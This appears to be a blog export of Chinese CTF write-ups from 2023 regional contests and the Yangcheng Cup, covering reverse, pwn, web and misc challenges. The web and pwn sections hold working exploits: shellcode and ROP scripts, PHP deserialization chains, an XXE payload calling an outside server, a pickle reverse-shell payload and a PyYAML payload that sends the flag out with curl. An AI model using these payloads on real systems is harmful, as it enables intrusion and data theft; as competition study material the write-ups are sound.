reverserrrrsdef decode(a):    a^=a&gt;&gt;18    a^=(a&lt;&lt;15)&amp;0xefc60000    for i in range(4):        a^=((a&amp;(127&lt;&lt;(7*i)))&lt;&lt;7)&amp;(0x9d2c5680)    for i in range(3):        a^=(a&amp;(4292870144&gt;&gt;(11*i)))&gt;&gt;11    return a.to_bytes(4,&#x27;big&#x27;)c=[0xa7a1e601,0x10a6a5df,0xa3f03b11,0x7e523d64,0xcb99d7a8,0x2ddc2485,0xe3c8b3cd,0x6b82a51e,0x0ea07814,0x6bf2bf07]flag=b&quot;&quot;for i in c:    flag+=decode(i)print(flag)


pwnbabyshellfrom pwn import *context.arch=&#x27;amd64&#x27;p=remote(&quot;tcp.cloud.dasctf.com&quot;,&quot;21844&quot;)#p=process(&#x27;babyshell&#x27;)#gdb.attach(p,&quot;bp $rebase(0x1366)&quot;)#pause()shellcode=shellcraft.openat(-100,&quot;flag&quot;)shellcode+=shellcraft.brk()shellcode+=&quot;&quot;&quot;mov rsi,raxsub rsi,0x1000mov rdi,3mov rdx,0x100mov rax,0syscallmov rdi,1mov rax,1syscall&quot;&quot;&quot;p.send(asm(shellcode))p.interactive()

mercedesfrom pwn import *p=remote(&#x27;tcp.cloud.dasctf.com&#x27;,&#x27;28629&#x27;)e=ELF(&quot;mercedes&quot;)context.binary=esystem=e.plt[&#x27;system&#x27;]comm=0x601090rdi=0x0000000000400983ret=0x00000000004005aep.sendafter(&#x27;drink&#x27;,&#x27;tac flag 1&gt;&amp;2&#x27;)p.sendafter(&#x27;you?&#x27;,b&#x27;a&#x27;*0x28+p64(rdi)+p64(comm)+p64(ret)+p64(system))p.interactive()]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>台州</tag>
        <tag>2023竞赛</tag>
      </tags>
  </entry>
  <entry>
    <title>2023宁波市赛wp</title>
    <url>/posts/2d3983d/</url>
    <content><![CDATA[webQuerysqlmap一把梭

Deserialization源码
//The location of the flag is at route.php$read = $_POST[&quot;read&quot;];$input = $_POST[&quot;input&quot;];if(!isset($read) or !isset($input))&#123;    die(&quot;NONONO!&quot;);&#125;if(strpos($read, &quot;f14g&quot;)===FALSE)&#123;    include($read);    $input = unserialize($input);    $input2 = clone $input;    $input2-&gt;position = &quot;route.php&quot;;&#125;else&#123;    die(&quot;NONONO!&quot;);&#125;

php://filter读route.php
得到
&lt;h1&gt;Here can you find the position of the flag!&lt;/h1&gt;&lt;?php$position = &quot;f14g.php&quot;;$gadget = &quot;h1nt.php&quot;;?&gt;

再读h1nt.php
&lt;?phpclass test&#123;    public $position;    public function __clone()&#123;        echo file_get_contents($this-&gt;position);        return $this-&gt;position;    &#125;&#125;?&gt;

反序列化，调用__clone方法时读f14g.phppayload
&lt;?phpclass test&#123;    public $position=&#x27;f14g.php&#x27;;&#125;$a = new test();echo serialize($a);//read=h1nt.php&amp;input=O:4:&quot;test&quot;:1:&#123;s:8:&quot;position&quot;;s:8:&quot;f14g.php&quot;;&#125;


CodeCheck$flag = &quot;***********&quot;;if(!isset($_GET[&#x27;a&#x27;]) or !isset($_GET[&#x27;b&#x27;]))&#123;    die(&quot;NONONO&quot;);&#125;if(file_get_contents($_GET[&#x27;a&#x27;])!== &quot;flag&quot;)&#123;    die(&quot;NONONO&quot;);&#125;if(file_get_contents($_GET[&#x27;b&#x27;])!==$_GET[&#x27;c&#x27;])&#123;    die(&quot;NONONO&quot;);&#125;if(isset($_GET[&#x27;d&#x27;]))&#123;    include($_GET[&#x27;d&#x27;]);&#125;

使用php://input使得a的值为flag，b同理，d使用php://filter读文件

easy_java访问靶机自动跳转到/parser?body=%7B&quot;1&quot;%3A&quot;2&quot;%7D，并返回json访问/parser?body=1，返回plain
猜测这是一个类型解析器，可以解析输入的数据类型并返回
fuzz后发现支持xml格式，尝试利用xxe漏洞。因为是java环境，尝试使用jar协议，原理参考

vps上用flask构建一个恶意dtd
&lt;!ENTITY % c SYSTEM &quot;file:///flag&quot;&gt;&lt;!ENTITY % a &quot;&lt;!ENTITY remote SYSTEM &#x27;jar:http://20.2.129.79/1.zip!/%c;&#x27;&gt;&quot;&gt;

在apache上放一个1.zip，内容随意
当jar协议在1.zip中找不到file://中指定的文件时就会报错，通过报错回显文件内容
且过滤了&quot;http，可以使用&quot;url:http来绕过
最终payload
&lt;!DOCTYPE convert [    &lt;!ENTITY % b SYSTEM &quot;url:http://20.2.129.79:7777/evil.dtd&quot;&gt;    %b;    %a;]&gt;&lt;convert&gt;&amp;remote;&lt;/convert&gt;


easy_upload打开靶机后有一个文件上传功能
但是对路径，后缀，文件内容进行了检测
路径中过滤了..，不能进行目录穿越，只能存放在/tmp/下，·且后缀检查的黑名单较严格
&lt;?phpfunction check_path($path)&#123;    $black_list = [&quot;php&quot;,&#x27;\.\.&#x27;,&quot;htaccess&quot;,&quot;ini&quot;,&quot;html&quot;];    if (preg_match(&#x27;/(&#x27; . implode(&#x27;|&#x27;, $black_list) . &#x27;)/i&#x27;, strtolower($path))) &#123;        return false;    &#125;    return true;&#125;function check_extension($extension)&#123;    $black_list = array(&#x27;php&#x27;, &#x27;php3&#x27;, &#x27;php4&#x27;, &#x27;php5&#x27;, &#x27;phtml&#x27;, &#x27;py&#x27;, &#x27;pl&#x27;,&#x27;pyc&#x27;,&#x27;php7&#x27;,&#x27;html&#x27;,&#x27;ini&#x27;,&#x27;htaccess&#x27;);    if (in_array(strtolower($extension),$black_list))&#123;        return false;    &#125;    return true;&#125;function up_base64($file_path, $base64)&#123;    if (preg_match(&#x27;/^(data:\s*image\/(\w*);base64,)/&#x27;, $base64, $result)) &#123;        $type = $result[2];        if (!check_extension($type))&#123;            return false;        &#125;        $res = &#x27;/tmp/&#x27; . time() . &quot;/&quot;;        if (!is_dir($res)) &#123;            mkdir($res, 0777);        &#125;        $newFile = $res . $file_path . &quot;.&#123;$type&#125;&quot;;    //图片名以时间命名        //保存为文件        if (file_put_contents($newFile, base64_decode(str_replace($result[1], &#x27;&#x27;, $base64)))) &#123;            //返回这个图片的路径            return $newFile;        &#125; else &#123;            return false;        &#125;    &#125; else &#123;        return false;    &#125;&#125;if (isset($_GET[&quot;action&quot;]) and $_GET[&#x27;action&#x27;] == &#x27;base64&#x27;) &#123;    if (check_path($_GET[&quot;path&quot;])) &#123;        $res = up_base64($_GET[&quot;path&quot;], file_get_contents(&quot;php://input&quot;));        if (!$res)&#123;            echo &quot;&lt;h1&gt;upload success&lt;/h1&gt;&quot;;        &#125;else&#123;            echo &quot;&lt;h1&gt;Hacker!&lt;/h1&gt;&quot;;        &#125;    &#125;&#125; else &#123;    highlight_file(__FILE__);&#125;

同时扫描网址发现存在/app路由

import sysfrom flask import Flask, requestfrom challenge import challengeimport reapp = Flask(__name__)def check(value: str):    black_list = [&quot;app&quot;, &quot;_static_folder&quot;, &quot;pardir&quot;, &quot;os&quot;,                  &quot;env&quot;, &quot;jinja&quot;, &quot;modules&quot;, &quot;exported&quot;,&quot;loader&quot;,&quot;__spec__&quot;]    if re.findall(&quot;r&#x27;[^\w\.\[\]]&#x27;&quot;, value):        return False    else:        for i in black_list:            if i in value:                return False    return True@app.route(&quot;/app/set&quot;, methods=[&quot;POST&quot;])def set():    key, value = request.json.get(&#x27;key&#x27;), request.json.get(&#x27;value&#x27;)    if not key or type(key) != str:        return &#123;&quot;message&quot;: &quot;Not key or key must be str&quot;&#125;, 400    if len(key) &gt; 100:        return &#123;&quot;message&quot;: &quot;Key may be too long!&quot;&#125;, 400    if value and len(value) &gt; 20:        return &#123;&quot;message&quot;: &quot;Value may  be too long!&quot;&#125;, 400    if not value:        game.complete(value)        return &#123;&quot;message&quot;: &quot;Key set success !&quot;&#125;, 200    if type(value) != str:        return &#123;&quot;message&quot;: &quot;Value must be a string!&quot;&#125;, 400    if not check(key):        print(key)        return &#123;&quot;message&quot;: &quot;Hacker!&quot;&#125;, 400    # pydash?    if game.set(key, value):        return &#123;&quot;message&quot;: &quot;Task updated!&quot;&#125;, 200    return &#123;&quot;message&quot;: &quot;Invalid task name!&quot;&#125;, 400@app.route(&quot;/app/&quot;, methods=[&quot;GET&quot;])def get_source():    fp = open(__file__)    res = fp.read()    fp.close    return res.replace(&quot; &quot;, &quot; &quot;).replace(&quot;\n&quot;, &quot;&quot;)@app.route(&quot;/app/get&quot;, methods=[&quot;GET&quot;])def get_date():    import backdoor    flag = backdoor.backdoor()    sys.modules.pop(&quot;backdoor&quot;)    return flaggame = challenge()app.run(&#x27;0.0.0.0&#x27;, 3000)

其中有三个路由
/app显示当前代码/app/get存在后门，有导入包的操作/app/set用于设置键值对
其中存在提示# pydash?，表示通过pydash设置属性，而pydash低版本存在类污染，可以利用pydash.set来设置或覆盖属性值，也可以设置路径
在/app/get路由中存在一个import的操作，当Python解释器遇到import语句时，它会在sys.path变量中指定的路径中搜索模块，其中sys.path[0]则表示最初调用Python解释器的脚本所在的绝对路径
所以我们可以上传一个名称为backdoor的py文件，再利用pydash.set覆盖sys.path[0]的值，使其寻找包时找到我们的恶意包
同时题目中还存在一个waf
black_list = [&quot;app&quot;, &quot;_static_folder&quot;, &quot;pardir&quot;, &quot;os&quot;,                  &quot;env&quot;, &quot;jinja&quot;, &quot;modules&quot;, &quot;exported&quot;,&quot;loader&quot;,&quot;__spec__&quot;]

可以利用pydash.helpers导入inspect来绕过

还有一点要注意，上传时对$type进行了检查，不允许上传py类型的文件，但是$type的值是可控的，我们可以将其置空
//line 32$newFile = $res . $file_path . &quot;.&#123;$type&#125;&quot;;

如果$type为空，就会在文件尾加一个点，例如backdoor.py.
这里可以用file_put_contents的一个trick绕过，如图

例如backdoor.py/.，file_put_contents会自已给标准化成绝对路径
exp
import timeimport requestsimport base64url = &quot;x.x.x.x&quot;shell = &#x27;&#x27;&#x27;import osdef backdoor():    return os.popen(&quot;cat /flag&quot;).read()&#x27;&#x27;&#x27;def exploit():    data = &quot;data:image/;base64,&quot; + base64.b64encode(shell.encode()).decode()    start = int(time.time())    res = requests.post(        url=url+&quot;index.php?action=base64&amp;path=backdoor.py/&quot;, data=data)    end = int(time.time())    for i in range(start, end+2):        print(i)        data = &#123;            &quot;key&quot;: &quot;__init__.__globals__.pydash.helpers.inspect.sys.path[0]&quot;,            &quot;value&quot;: &quot;/tmp/%s/&quot; % (i)        &#125;        print(data)        requests.post(url=url+&quot;app/set&quot;,json=data)        res = requests.get(url=url+&quot;app/get&quot;)        if &quot;flag??&quot; not in res.text and res.status_code != 500:            print(res.text)            break        else:            print(res.text)if __name__ == &quot;__main__&quot;:    exploit()





misczipzip注释：The art of 0 and 1, and it will remain shorter than 9.
生成字典
my_dict = &#123;&#125;for i in range(1, 10):    bin_strings = [bin(j)[2:].zfill(i) for j in range(2**i)]    my_dict[i] = bin_stringsfor key,value in my_dict.items():    with open(&#x27;dic.txt&#x27;,&#x27;a+&#x27;)as f:        for i in value:            f.write(i+&#x27;\n&#x27;)

爆破得到密码01001101
解压得到flag
SimpleDocument图片分离出一个pdf，用pdf编辑器全选，发现有一个隐藏的文本

BeautifulImagestegsolve分析，0通道藏有base加密字符串

tree下载附件得到一个tree.py，约有60w行代码
部分代码如下
import os# the o mean is 0!class tree_0aB30386():    def tree_o02aA7B4(self):        if -1705 &lt; 2926:            tree_b270co58.tree_f79D6eB3(self)class tree_51o1oA3a():    def tree_433218o8(self):        if 1793 &lt; -5366:            tree_B813Fe08.tree_AaA1b735(self)class tree_2598o3do():    def tree_7C0ooB75(self):        if -7226 &gt; -7705:            tree_3482o9ob.tree_0d6aDA0F(self)class tree_0a351C93():    def tree_39cD9171(self):        if 9865 &lt; 592:            tree_Coc29fcC.tree_22E98104(self)class tree_170EE546():    def tree_70759F44(self):        if -8714 &lt; 4093:            tree_8D0oE9Cf.tree_2F7682e6(self)

且存在部分函数调用os.system，执行的语句均为cat /*
除了os函数外，其他函数都存在一个if，判断成功时引用下一个类
例如：
import randomimport osimport astclass tree_91fo80eD():   def tree_7040e9o9(self):       os.system(&#x27;cat /*&#x27;)class tree_88eF054e():   def tree_o00o0b68(self):       tree_91fo80eD.tree_7040e9o9(self)class tree_1a0c10D0():   def tree_4Cc0o1Do(self):       tree_88eF054e().tree_o00o0b68(self)

这段代码的完整利用链为：tree_1a0c10D0.tree_4Cc0o1Do() -&gt; tree_88eF054e.tree_o00o0b68() -&gt; tree_91fo80eD.tree_7040e9o9()
所以我们需要分析代码，找到最终触发os.system的利用链，并提取出来
同时对所有os.system语句标记污点，如果遇到if判断错误的，则直接取消污点标记，并一直往上寻找最终利用链，并记录类名、函数名和函数内的具体内容
根据提示# the o mean is 0!，提取所有完整利用链的类名的后8位十六进制字符，并将o转化为0
import astimport sysimport astor# 解析Python文件，获取语法树with open(&quot;tree.py&quot;, &quot;r&quot;) as file:   source_code = file.read()syntax_tree = ast.parse(source_code)# 初始化类名和函数字典class_dict = &#123;&#125;# 遍历语法树，获取类和函数名for node in syntax_tree.body:   if isinstance(node, ast.ClassDef):       class_name = node.name       class_dict[class_name] = &#123;&#125;       for inner_node in node.body:           if isinstance(inner_node, ast.FunctionDef):               func_name = inner_node.name               class_dict[class_name][func_name] = []               for code in inner_node.body:                   class_dict[class_name][func_name].append(astor.to_source(code).strip())# 输出结果class_keys = []for func_dict in class_dict.items():   if &#x27;os.system&#x27; in str(func_dict):       sub = func_dict[1][list(func_dict[1].items())[0][0]][0].split(&#x27;\n&#x27;)[0].split(&#x27; &#x27;)       if sub[2] == &#x27;&gt;&#x27;:           if int(sub[1]) &lt; int(sub[3][:-1]):               continue       elif sub[2] == &#x27;&lt;&#x27;:           if int(sub[1]) &gt; int(sub[3][:-1]):               continue       class_keys.append(func_dict[0])for key in class_keys:   class_key = key   func_key = list(class_dict[class_key])[0]   list_class = [class_key]   flag = 1   flags = 0   while flag != 0 and flags == 0:       flag = 1       flags = 0       for func_dict in class_dict.items():           for code in func_dict[1].items():               # print(func_dict[1].items(), flag)               if class_key in code[1][0] and func_key in code[1][0]:                   sub = code[1][0].split(&#x27;\n&#x27;)[0].split(&#x27; &#x27;)                   if sub[2] == &#x27;&gt;&#x27;:                       if int(sub[1]) &lt; int(sub[3][:-1]):                           flag = -1                   elif sub[2] == &#x27;&lt;&#x27;:                       if int(sub[1]) &gt; int(sub[3][:-1]):                           flag = -1                   flags = 2                   func_key = code[0]                   class_key = func_dict[0]                   # print(func_key, class_key)                   # print(func_key, class_key)                   list_class.append(class_key)                   # print(list_class)       else:           # print(flag, flags)           if flag == -1:               flags = 1           if flags == 2:               flags = 0               continue           if flag == 1 and flags == 0:               break   # 将完整利用链的类名，去除tree_，o改为0，按照顺序输出成字符串   if flag != -1:       for cla in list_class:           print(cla[5:].replace(&#x27;o&#x27;, &#x27;0&#x27;), end=&#x27;&#x27;)       print(&#x27;&#x27;)

最终得到两条完整的利用链
7468652070617373776f7264206973203730383532613933613336343963613736653335626138353833376566613135

377aBCAf271c00041373e10830000000000000006A0000000000000057Acbd47A5c4CDB728a43AF6d91D92D25519Bac7876E97909B633223d3A1d7417A3a741ddAfB0E9A7F0b25C726085149ad1da4D40104060001093000070B0100022406F1070112530f9A96C63163E0Df042FD12EC0b32431902121010001000C2A2600080a017088A4910000050119010011130066006c00610067002e0074007800740000001900140a01008B43f758BE7Ad901150601002000000000000000

转字符串后发现一个为7z文件，一个为the password is 70852a93a3649ca76e35ba85837efa15，解压得到flag
hacker_traffic在第4615条流中发现flag.zip

注释内容：password is (md5(virus_file) + lhost_ip)
同时发现流量中有很多elf文件，使用tshark或者python提取
这里使用binwalk，但是需要注意部分binwalk版本不能提取elf文件
需要修改/usr/lib/python3/dist-packages/binwalk/config/extract.conf文件(以kali默认位置为例)

共提取出100个elf文件，且每个elf文件运行后都会打印一个md5值
使用tcpdump监听后运行所有elf文件tcpdump -tttt -s0 -X -vv -w t.pcap
#!/bin/bash# 使用find命令查找当前文件夹下所有的elf文件elf_files=$(find . -maxdepth 1 -type f -executable -name &quot;*.elf&quot;)# 使用循环依次执行每一个elf文件for file in $elf_filesdo  echo &quot;Executing $file&quot;  ./$filedone


分析t.pcap文件，发现只有22E7CF.elf访问了192.168.3.201这个ip

将文件md5和地址拼接后解压提示密码错误，是因为tcp传输文件会有冗余，需要计算elf文件的真正大小
readelf读文件

得到
Start of section headers:          14736 (bytes into file)Size of section headers:           64 (bytes)Number of section headers:         30

参考文章：计算机原理系列之二 ——– 详解ELF文件
计算得到14736+64*30=16656字节
16656即4110(16进制)，将冗余的数据去除

计算真正的md5

拼接起来，得到0f82ecb23adc35a4a5e3d8bdabbafe15192.168.3.201
解压得到一个py脚本
from flag import secretkey = &quot;x.x.x.x&quot;def encrypt_flag(flag, key):    random.seed(key)    table = list(range(0, 38))    random.shuffle(table)    flag = [flag[i] for i in table]    ascii_flag = [ord(c) for c in flag]    random.seed(key)    xor_key = random.randint(0, 255)    encrypted_flag = [c ^ xor_key for c in ascii_flag]    return base64.b64encode(bytes(encrypted_flag)).decode(&quot;ascii&quot;)print(encrypt_flag(flag, key))# VFVWU1kGBgIMUlMBVFcBBgRRBFAHVFBVUFkbUB0DAQMEBVIGAlE=

伪随机+shuffle生成s盒进行的置换异或加密
根据key=&quot;x.x.x.x&quot;可知key就是ip地址，为192.168.3.201
import base64import randomdef decrypt_flag(encrypted_flag, key):   random.seed(key)   table = list(range(0, 38))   random.shuffle(table)   # 解码base64编码的字符串   encrypted_flag = base64.b64decode(encrypted_flag.encode(&quot;ascii&quot;))   # 随机生成一个密钥   random.seed(key)   xor_key = random.randint(0, 255)   # 对加密后的ASCII码列表进行异或运算   decrypted_flag = [c ^ xor_key for c in encrypted_flag]   # 将异或后的ASCII码列表转换成字符列表   flag = &#x27;&#x27;.join([chr(c) for c in decrypted_flag])   final_flag = [0]*38   for i in range(0, len(table)):       final_flag[table[i]] = flag[i]   # 返回解密后的flag字符串   return &#x27;&#x27;.join(final_flag)key = &quot;192.168.3.201&quot;text = &#x27;VFVWU1kGBgIMUlMBVFcBBgRRBFAHVFBVUFkbUB0DAQMEBVIGAlE=&#x27;flag = decrypt_flag(text, key)print(flag)
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>宁波</tag>
        <tag>2023竞赛</tag>
      </tags>
  </entry>
  <entry>
    <title>2023羊城杯初赛misc&amp;web wp</title>
    <url>/posts/58b7474e/</url>
    <content><![CDATA[webD0n’t pl4y g4m3!!!访问/p0p.php，返回一个hint.zip
Ö_0 0vO Ow0 0w0 Ö_0 Ö_O Ö.O o_o 0.O OvO o.0 owo o.Ö Ö.Ö Ovo 0_Ö Ö_o owO O.0 owo Ö_o owO O.0 owo Ö_0 0wÖ O.0 0w0 Ö_0 OwO ov0 owo o_O O.Ö Övo

尊嘟假嘟翻译器O.o得到flag在/tmp/catcatf1ag.txt
利用  PHP&lt;&#x3D;7.4.21 Development Server源码泄露漏洞  得到源码

&lt;?phpheader(&quot;HTTP/1.1 302 found&quot;);header(&quot;Location:https://passer-by.com/pacman/&quot;);class Pro&#123;    private $exp;    private $rce2;    public function __get($name)    &#123;        return $this-&gt;$rce2=$this-&gt;exp[$rce2];    &#125;    public  function __toString()    &#123;            call_user_func(&#x27;system&#x27;, &quot;cat /flag&quot;);     &#125;&#125;class Yang&#123;    public function __call($name, $ary)    &#123;        if ($this-&gt;key === true || $this-&gt;finish1-&gt;name) &#123;            if ($this-&gt;finish-&gt;finish) &#123;                call_user_func($this-&gt;now[$name], $ary[0]);            &#125;        &#125;    &#125;    public function ycb()    &#123;        $this-&gt;now = 0;        return $this-&gt;finish-&gt;finish;    &#125;    public function __wakeup()    &#123;        $this-&gt;key = True;    &#125;&#125;class Cheng&#123;    private $finish;    public $name;    public function __get($value)    &#123;        return $this-&gt;$value = $this-&gt;name[$value];    &#125;&#125;class Bei&#123;    public function __destruct()    &#123;        if ($this-&gt;CTF-&gt;ycb()) &#123;            $this-&gt;fine-&gt;YCB1($this-&gt;rce, $this-&gt;rce1);        &#125;    &#125;    public function __wakeup()    &#123;        $this-&gt;key = false;    &#125;&#125;function prohib($a)&#123;    $filter = &quot;/system|exec|passthru|shell_exec|popen|proc_open|pcntl_exec|eval|flag/i&quot;;    return preg_replace($filter,&#x27;&#x27;,$a);&#125;$a = $_POST[&quot;CTF&quot;];if (isset($a))&#123;  unserialize(prohib($a));&#125;?&gt;

一个php反序列化，从hint中得知flag位置不在根目录，所以Pro类可以舍弃发现敏感函数call_user_func，所以最终应该要调用__call，而在Bei中__destruct()存在函数调用，poc如下
$a = new Bei();$a -&gt; CTF = new Yang();$a -&gt; CTF -&gt; finish = new Cheng();$a -&gt; CTF -&gt; finish -&gt; name = array(&quot;finish&quot;=&gt;true);$a -&gt; fine = new Yang();$a -&gt; rce = &quot;/tmp/catcatf1ag.txt&quot;;$a -&gt; fine -&gt; finish = new Cheng();$a -&gt; fine -&gt; finish -&gt; name = array(&quot;finish&quot;=&gt;true);$a -&gt; fine -&gt; now = array(&quot;YCB1&quot;=&gt;&quot;highlight_file&quot;);echo urlencode(serialize($a));

O%3A3%3A%22Bei%22%3A3%3A%7Bs%3A3%3A%22CTF%22%3BO%3A4%3A%22Yang%22%3A1%3A%7Bs%3A6%3A%22finish%22%3BO%3A5%3A%22Cheng%22%3A2%3A%7Bs%3A13%3A%22%00Cheng%00finish%22%3BN%3Bs%3A4%3A%22name%22%3Ba%3A1%3A%7Bs%3A6%3A%22finish%22%3Bb%3A1%3B%7D%7D%7Ds%3A4%3A%22fine%22%3BO%3A4%3A%22Yang%22%3A2%3A%7Bs%3A6%3A%22finish%22%3BO%3A5%3A%22Cheng%22%3A2%3A%7Bs%3A13%3A%22%00Cheng%00finish%22%3BN%3Bs%3A4%3A%22name%22%3Ba%3A1%3A%7Bs%3A6%3A%22finish%22%3Bb%3A1%3B%7D%7Ds%3A3%3A%22now%22%3Ba%3A1%3A%7Bs%3A4%3A%22YCB1%22%3Bs%3A14%3A%22highlight_file%22%3B%7D%7Ds%3A3%3A%22rce%22%3Bs%3A19%3A%22%2Ftmp%2Fcatcatf1ag.txt%22%3B%7D
最后那个过滤用highlight_file函数或者双写都可以绕过

Serpentwww.zip下载源码
from flask import Flask, sessionfrom secret import secret@app.route(&#x27;/verification&#x27;)def verification():    try:        attribute = session.get(&#x27;Attribute&#x27;)        if not isinstance(attribute, dict):            raise Exception    except Exception:        return &#x27;Hacker!!!&#x27;    if attribute.get(&#x27;name&#x27;) == &#x27;admin&#x27;:        if attribute.get(&#x27;admin&#x27;) == 1:            return secret        else:            return &quot;Don&#x27;t play tricks on me&quot;    else:        return &quot;You are a perfect stranger to me&quot;if __name__ == &#x27;__main__&#x27;:    app.run(&#x27;0.0.0.0&#x27;, port=80)

访问/verification，进行session伪造，得到Hello admin, welcome to /ppppppppppick1e

访问/ppppppppppick1e，得到Hint: Source in /src0de
@app.route(&#x27;/src0de&#x27;)def src0de():    f = open(__file__, &#x27;r&#x27;)    rsp = f.read()    f.close()    return rsp[rsp.index(&quot;@app.route(&#x27;/src0de&#x27;)&quot;):]@app.route(&#x27;/ppppppppppick1e&#x27;)def ppppppppppick1e():    try:        username = &quot;admin&quot;        rsp = make_response(&quot;Hello, %s &quot; % username)        rsp.headers[&#x27;hint&#x27;] = &quot;Source in /src0de&quot;        pick1e = request.cookies.get(&#x27;pick1e&#x27;)        if pick1e is not None:            pick1e = base64.b64decode(pick1e)        else:            return rsp        if check(pick1e):            pick1e = pickle.loads(pick1e)            return &quot;Go for it!!!&quot;        else:            return &quot;No Way!!!&quot;    except Exception as e:        error_message = str(e)        return error_message    return rspclass GWHT():    def __init__(self):        passif __name__ == &#x27;__main__&#x27;:    app.run(&#x27;0.0.0.0&#x27;, port=80)

pickle反序列化rce
反弹shell
import pickleimport base64payload= b&#x27;&#x27;&#x27;(S&#x27;python3 -c &#x27;import os,pty,socket;s=socket.socket();s.connect((&quot;ip&quot;,port));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(&quot;/bin/sh&quot;)&#x27;&#x27;iossystem.&#x27;&#x27;&#x27;print(base64.b64encode(payload))

发现没有权限

查找有权限的命令
find /bin/ -perm 777或者find / -perm -u=s -type f 2&gt;/dev/null
发现python3有权限，使用python3读flagpython3 -c &#39;print(open(&quot;/flag&quot;).read())&#39;

ArkNightsimport uuidfrom flask import *from werkzeug.utils import *app = Flask(__name__)app.config[&#x27;SECRET_KEY&#x27;] =str(uuid.uuid4()).replace(&quot;-&quot;,&quot;*&quot;)+&quot;Boogipopisweak&quot;@app.route(&#x27;/&#x27;)def index():    name=request.args.get(&quot;name&quot;,&quot;name&quot;)    m1sery=[request.args.get(&quot;m1sery&quot;,&quot;Doctor.Boogipop&quot;)]    if(session.get(&quot;name&quot;)==&quot;Dr.Boog1pop&quot;):        blacklist=re.findall(&quot;/ba|sh|\\\\|\[|]|#|system|&#x27;|\&quot;/&quot;, name, re.IGNORECASE)        if blacklist:            return &quot;bad hacker no way&quot;        exec(f&#x27;for [&#123;name&#125;] in [&#123;m1sery&#125;]:print(&quot;strange?&quot;)&#x27;)    else:        session[&#x27;name&#x27;] = &quot;Doctor&quot;    return render_template(&quot;index.html&quot;,name=session.get(&quot;name&quot;))@app.route(&#x27;/read&#x27;)def read():        file = request.args.get(&#x27;file&#x27;)        fileblacklist=re.findall(&quot;/flag|fl|ag/&quot;,file, re.IGNORECASE)        if fileblacklist:            return &quot;bad hacker!&quot;        start=request.args.get(&quot;start&quot;,&quot;0&quot;)        end=request.args.get(&quot;end&quot;,&quot;0&quot;)        if start==&quot;0&quot; and end==&quot;0&quot;:            return open(file,&quot;rb&quot;).read()        else:            start,end=int(start),int(end)            f=open(file,&quot;rb&quot;)            f.seek(start)            data=f.read(end)            return data@app.route(&quot;/&lt;path:path&gt;&quot;)def render_page(path):    print(os.path.pardir)    print(path)    if not os.path.exists(&quot;templates/&quot; + path):        return &quot;not found&quot;, 404    return render_template(path)if __name__==&#x27;__main__&#x27;:    app.run(        debug=False,        host=&quot;0.0.0.0&quot;    )    print(app.config[&#x27;SECRET_KEY&#x27;])

有个任意文件读取，非预期解就直接读环境变量了

ezyamlimport tarfilefrom flask import Flask, render_template, request, redirectfrom hashlib import md5import yamlimport osimport reapp = Flask(__name__)def waf(s):    flag = True    blacklist = [&#x27;bytes&#x27;,&#x27;eval&#x27;,&#x27;map&#x27;,&#x27;frozenset&#x27;,&#x27;popen&#x27;,&#x27;tuple&#x27;,&#x27;exec&#x27;,&#x27;\\&#x27;,&#x27;object&#x27;,&#x27;listitems&#x27;,&#x27;subprocess&#x27;,&#x27;object&#x27;,&#x27;apply&#x27;]    for no in blacklist:        if no.lower() in str(s).lower():            flag= False            print(no)            break    return flagdef extractFile(filepath, type):    extractdir = filepath.split(&#x27;.&#x27;)[0]    if not os.path.exists(extractdir):        os.makedirs(extractdir)    if type == &#x27;tar&#x27;:        tf = tarfile.TarFile(filepath)        tf.extractall(extractdir)        return tf.getnames()@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;])def main():        fn = &#x27;uploads/&#x27; + md5().hexdigest()        if not os.path.exists(fn):            os.makedirs(fn)        return render_template(&#x27;index.html&#x27;)@app.route(&#x27;/upload&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])def upload():    if request.method == &#x27;GET&#x27;:        return redirect(&#x27;/&#x27;)    if request.method == &#x27;POST&#x27;:        upFile = request.files[&#x27;file&#x27;]        print(upFile)        if re.search(r&quot;\.\.|/&quot;, upFile.filename, re.M|re.I) != None:            return &quot;&lt;script&gt;alert(&#x27;Hacker!&#x27;);window.location.href=&#x27;/upload&#x27;&lt;/script&gt;&quot;        savePath = f&quot;uploads/&#123;upFile.filename&#125;&quot;        print(savePath)        upFile.save(savePath)        if tarfile.is_tarfile(savePath):            zipDatas = extractFile(savePath, &#x27;tar&#x27;)            return render_template(&#x27;result.html&#x27;, path=savePath, files=zipDatas)        else:            return f&quot;&lt;script&gt;alert(&#x27;&#123;upFile.filename&#125; upload successfully&#x27;);history.back(-1);&lt;/script&gt;&quot;@app.route(&#x27;/src&#x27;, methods=[&#x27;GET&#x27;])def src():    if request.args:        username = request.args.get(&#x27;username&#x27;)        with open(f&#x27;config/&#123;username&#125;.yaml&#x27;, &#x27;rb&#x27;) as f:            Config = yaml.load(f.read())            return render_template(&#x27;admin.html&#x27;, username=&quot;admin&quot;, message=&quot;success&quot;)    else:        return render_template(&#x27;index.html&#x27;)if __name__ == &#x27;__main__&#x27;:    app.run(host=&#x27;0.0.0.0&#x27;, port=8000)

&#x2F;upload路由中上传tar文件，然后通过&#x2F;src路由进行yaml解析，存在PyYAML反序列化漏洞
poc
!!python/object/apply:os.system [&quot;curl http://ip:7777/?flag=`cat /fl*|base64`&quot;]

制作tar包tar cPvf test.tar ../../config/config.yaml
上传后访问/src?username=config触发

miscai和nia的交响曲upload.php中上传了一个flag1.png
其中每条黑线到下条黑线恰好8bit，把黑色当成0，白色当成1，竖着读取后转字符串
from PIL import Imageimg = Image.open(&quot;1.png&quot;)width, height = img.sizeflag = &#x27;&#x27;for i in range(width):    for j in range(height):        pixel = img.getpixel((i, j))[0]        flag += &#x27;1&#x27; if pixel &gt;= 30 else &#x27;0&#x27;with open(&#x27;outs.txt&#x27;, &#x27;w&#x27;) as f:    f.write(flag)result = &#x27;&#x27;for i in range(0, len(flag), 8):    byte = flag[i:i+8]    decimal = int(byte, 2)    result += chr(decimal)print(result)

结尾得到HINT:BV1wW4y1R7Jv&amp;&amp;FLAG1:@i_n1a_l0v3S_
http流中还有一个flag2.zip，发现是伪加密
解压后的内容如下，其中还有0宽，但没什么用
00:0400:0100:2200:0400:0100:2200:1000:0100:1300:0900:0100:21

在hint中给的视频地址去找字母，得到CAOCAOGAIFAN
